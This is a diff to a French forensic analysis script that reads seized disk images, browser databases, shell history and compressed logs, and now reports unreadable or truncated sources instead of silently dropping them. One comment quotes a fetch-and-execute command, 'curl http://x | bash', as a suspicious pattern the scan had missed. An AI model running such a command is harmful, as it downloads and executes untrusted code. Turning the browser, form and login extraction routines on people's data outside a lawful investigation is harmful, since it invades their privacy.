@@ -823,11 +823,15 @@ MOTIFS_JOURNAL = [
     ("support", "disque amovible reconnu", 'Attached SCSI',
      re.compile(r'\[(sd[a-z]+)\]\s+Attached SCSI removable disk'),
      lambda m: (None, f"/dev/{m.group(1)}")),
-    # .*? et non .* : glouton, il partirait du « /media » de « /run/media ».
+    # Le préfixe de commande est tombé : « systemd[1]: Mounted
+    # /run/media/mrobert/CLE. » ne porte ni « mount », ni « gvfs », ni
+    # « udisks », et ce montage-là n'était jamais vu — alors que le skill
+    # conformite le voyait, sur le MÊME journal. Le chemin /run/media/<compte>/
+    # est à lui seul la signature, et le crible « /media/ » borne le coût.
     # Le compte est dans le chemin — c'est l'attribution la plus directe qui
     # existe pour un support amovible.
     ("support", "système de fichiers amovible monté", '/media/',
-     re.compile(r'(?:mount|gvfs|udisks).*?((?:/run)?/media/([^/\s]+)/\S*)'),
+     re.compile(r'((?:/run)?/media/([^/\s]+)/[^\s,;:]*[^\s,;:.])'),
      lambda m: (m.group(2), m.group(1), {"role": "montage-amovible"})),
     ("support", "montage demandé par un compte", 'on behalf of',
      re.compile(r'on behalf of uid (\d+)'),
@@ -1095,8 +1099,25 @@ def reseau(c):
 
 
 # ── 6 · navigation et téléchargements ─────────────────────────────────
+def _base_muette(source, quoi, e):
+    """Une base de navigateur qui ne rend rien doit le DIRE.
+
+    Une base abîmée, chiffrée, ou dont le schéma a changé — Chrome renomme ses
+    tables d'une version à l'autre — rendait zéro ligne en silence, et le
+    rapport se lisait « aucun historique » pour un profil qui était là, sous les
+    yeux. C'est le contresens le plus coûteux que ce script puisse produire :
+    une absence de preuve présentée comme une preuve d'absence.
+    """
+    if source:
+        fait("limite", f"base de navigateur illisible : {quoi}", source, source,
+             "sqlite3 sur une copie en lecture seule", confiance="certaine",
+             note=f"{type(e).__name__} : {e}. Ce qu'elle contenait n'est PAS "
+                  "dans l'analyse — ne lisez pas son silence comme une absence "
+                  "de navigation")
+
+
 @contextlib.contextmanager
-def _sqlite(blob):
+def _sqlite(blob, source=None):
     """Une base sqlite copiée hors des scellés, ouverte immuable : rien n'est
     jamais écrit dans la pièce, pas même un journal -wal."""
     with tempfile.NamedTemporaryFile(suffix=".sqlite") as tmp:
@@ -1104,7 +1125,8 @@ def _sqlite(blob):
         tmp.flush()
         try:
             cx = sqlite3.connect(f"file:{tmp.name}?mode=ro&immutable=1", uri=True)
-        except sqlite3.Error:
+        except sqlite3.Error as e:
+            _base_muette(source, "base non ouvrable", e)
             yield None
             return
         try:
@@ -1113,16 +1135,17 @@ def _sqlite(blob):
             cx.close()
 
 
-def _lignes(cx, sql, params=()):
+def _lignes(cx, sql, params=(), source=None, quoi=None):
     if cx is None:
         return []
     try:
         return cx.execute(sql, params).fetchall()
-    except sqlite3.Error:
+    except sqlite3.Error as e:
+        _base_muette(source, f"requête « {quoi or sql[:40]} » impossible", e)
         return []
 
 
-def _flux(cx, sql, params=()):
+def _flux(cx, sql, params=(), source=None, quoi=None):
     """Les mêmes lignes que _lignes, mais RENDUES AU FIL DE L'EAU.
 
     L'historique n'est pas borné — c'est une exigence du skill —, et un profil
@@ -1148,15 +1171,16 @@ def _flux(cx, sql, params=()):
             if not lot:
                 return
             yield from lot
-    except sqlite3.Error:
+    except sqlite3.Error as e:
+        _base_muette(source, f"lecture « {quoi or sql[:40]} » interrompue", e)
         return
 
 
-def _sqlite_lire(blob, requetes):
+def _sqlite_lire(blob, requetes, source=None):
     """(nom, lignes) pour chaque requête d'une même base."""
-    with _sqlite(blob) as cx:
+    with _sqlite(blob, source) as cx:
         for nom, sql in requetes:
-            lignes = _lignes(cx, sql)
+            lignes = _lignes(cx, sql, source=source, quoi=nom)
             if lignes:
                 yield nom, lignes
 
@@ -1256,7 +1280,7 @@ def _date_us(v, depuis_1601=False):
 
 
 def _cookies(source, compte, blob, requetes, outil, depuis_1601):
-    for _, lignes in _sqlite_lire(blob, requetes):
+    for _, lignes in _sqlite_lire(blob, requetes, source):
         for hote, combien, cree, vu in lignes:
             fait("navigation", "domaine ayant posé un cookie", hote, source,
                  f"sqlite3 sur les cookies {outil}, regroupé par domaine "
@@ -1284,7 +1308,7 @@ def _logins_firefox(source, compte, blob, req, outil):
 
 
 def _logins_chrome(source, compte, blob, req, outil):
-    for _, lignes in _sqlite_lire(blob, req):
+    for _, lignes in _sqlite_lire(blob, req, source):
         for site, cree, vu in lignes:
             fait("usage", "mot de passe enregistré dans le navigateur", site, source,
                  "colonne origin_url de la table logins (identifiant et mot de passe non lus)",
@@ -1293,10 +1317,10 @@ def _logins_chrome(source, compte, blob, req, outil):
 
 
 def _historique_navigateur(source, compte, blob, req, outil):
-    with _sqlite(blob) as cx:
+    with _sqlite(blob, source) as cx:
         # _flux et non _lignes : c'est la seule requête sans borne de la
         # collecte, et la seule dont la liste complète ne servirait à rien
-        for ts, url, titre, combien, premiere in _flux(cx, req["visite"]):
+        for ts, url, titre, combien, premiere in _flux(cx, req["visite"], source=source, quoi="visite"):
             ts, premiere = _iso_z(ts), _iso_z(premiere)
             note = f"{combien} visite(s)" if combien else ""
             if premiere and premiere != ts:
@@ -1306,17 +1330,17 @@ def _historique_navigateur(source, compte, blob, req, outil):
             fait("navigation", "page visitée", url, source,
                  f"sqlite3 sur l'historique {outil}", horodatage=ts, acteur=compte,
                  note=note or None)
-        for ts, cible, origine in _lignes(cx, req["telechargement"]):
+        for ts, cible, origine in _lignes(cx, req["telechargement"], source=source, quoi="téléchargement"):
             fait("telechargement", "fichier téléchargé", cible, source,
                  f"sqlite3 sur les téléchargements {outil}", horodatage=_iso_z(ts),
                  acteur=compte, note=f"depuis {origine}" if origine else None)
-        for ts, url, titre in (_lignes(cx, req["marque-page"])
+        for ts, url, titre in (_lignes(cx, req["marque-page"], source=source, quoi="marque-page")
                                if req.get("marque-page") else []):
             fait("navigation", "marque-page enregistré", url, source,
                  f"sqlite3 sur les marque-pages {outil}", horodatage=_iso_z(ts),
                  acteur=compte, note=(titre or None),
                  confiance="certaine")
-        for ts, terme, url in (_lignes(cx, req["recherche"])
+        for ts, terme, url in (_lignes(cx, req["recherche"], source=source, quoi="recherche")
                                if req.get("recherche") else []):
             fait("navigation", "recherche saisie dans la barre d'adresse", terme, source,
                  f"sqlite3 sur keyword_search_terms {outil}", horodatage=_iso_z(ts),
@@ -1353,7 +1377,7 @@ REQ_FORMULAIRES_CHROME = [
 
 
 def _formulaires(source, compte, blob, req, outil):
-    for _, lignes in _sqlite_lire(blob, req):
+    for _, lignes in _sqlite_lire(blob, req, source):
         for champ, valeur, combien, premier, dernier in lignes:
             fait("usage", "saisie dans un formulaire", _coupe(str(valeur), 200), source,
                  f"sqlite3 sur l'historique de formulaires {outil}",
@@ -1613,7 +1637,13 @@ def _lignes_historique(txt):
         if m:
             lignes.append((m.group(2), _epoch_iso(int(m.group(1)))))
             continue
-        if l.strip() and not l.startswith("#"):
+        # Une ligne commençant par « # » n'est PAS écartée : RE_HISTO_EPOCH
+        # attrape déjà les marqueurs de date, et le reste, bash l'a enregistré
+        # parce que l'utilisateur l'a TAPÉ. Le skill conformite les gardait :
+        # les deux rapports annonçaient des comptes différents pour le même
+        # fichier, et une commande commentée — « # curl http://x | bash » —
+        # échappait entièrement au balayage des motifs suspects.
+        if l.strip():
             lignes.append((l, quand))
             quand = None
     return lignes
@@ -2737,6 +2767,18 @@ def _zstd(fh):
         return None
 
 
+def _borne(fh, nom):
+    """Les octets d'un flux comprimé, jusqu'au plafond d'archive."""
+    with contextlib.closing(fh):
+        clair = fh.read(PLAFOND_ARCHIVE + 1)
+    if len(clair) > PLAFOND_ARCHIVE:
+        fait("limite", "journal tourné lu en partie", nom, nom,
+             f"décompression bornée à {_taille(PLAFOND_ARCHIVE)}",
+             note="ce qui suit le plafond n'est PAS dans l'analyse")
+        return clair[:PLAFOND_ARCHIVE]
+    return clair
+
+
 def decomprimer(nom, blob):
     """Le contenu d'un journal tourné, quel que soit son compresseur.
 
@@ -2745,9 +2787,13 @@ def decomprimer(nom, blob):
     l'appelant en fait un fait, pour que le silence ne passe pas pour une
     absence de preuve.
     """
+    # Un plafond, comme _blocs en a un : gzip.decompress d'un .gz de 64 Ko
+    # rendant 64 Mio faisait un pic mesuré de 141 Mio, sans aucune borne, et un
+    # journal tourné se comprime d'un facteur trois cents. On décompresse donc
+    # en flux, et on s'arrête en le DISANT.
     try:
         if nom.endswith(".gz"):
-            return gzip.decompress(blob)
+            return _borne(gzip.GzipFile(fileobj=io.BytesIO(blob)), nom)
         if nom.endswith((".xz", ".lzma")):
             return lzma.decompress(blob)
         if nom.endswith(".bz2"):
@@ -3200,7 +3246,16 @@ def _morceaux(lecteur, ouvrir, etat, bloc=1 << 20):
 # rangé dans un tar et au fichier comprimé posé sur le disque : ajouter un
 # compresseur ici le rend lisible partout, et il n'y a pas d'endroit où un
 # .zst serait vu et un autre où il passerait pour du binaire.
-_FLUX = ((".bz2", bz2.BZ2File), (".xz", lzma.LZMAFile), (".lzma", lzma.LZMAFile),
+# Le .gz y figure comme les autres. _blocs sait l'ouvrir depuis toujours, mais
+# _comprimee rendait False et _apercu était donc AVEUGLE au .gz : un document
+# rendu par le carving sous ce nom n'était jamais caractérisé, alors que le
+# commentaire promettait qu'« ajouter un compresseur ici le rend lisible
+# partout ». Le plus courant de tous n'y était pas.
+# gzip.GzipFile prend un NOM DE FICHIER en premier argument, là où BZ2File et
+# LZMAFile acceptent l'objet : d'où le fileobj= explicite. Sans lui, la phase
+# entière tombait sur « TypeError: expected str, bytes or os.PathLike ».
+_FLUX = ((".gz", lambda fh: gzip.GzipFile(fileobj=fh)), (".bz2", bz2.BZ2File),
+         (".xz", lzma.LZMAFile), (".lzma", lzma.LZMAFile),
          (".zst", lambda fh: _zstd(fh)))
 
 
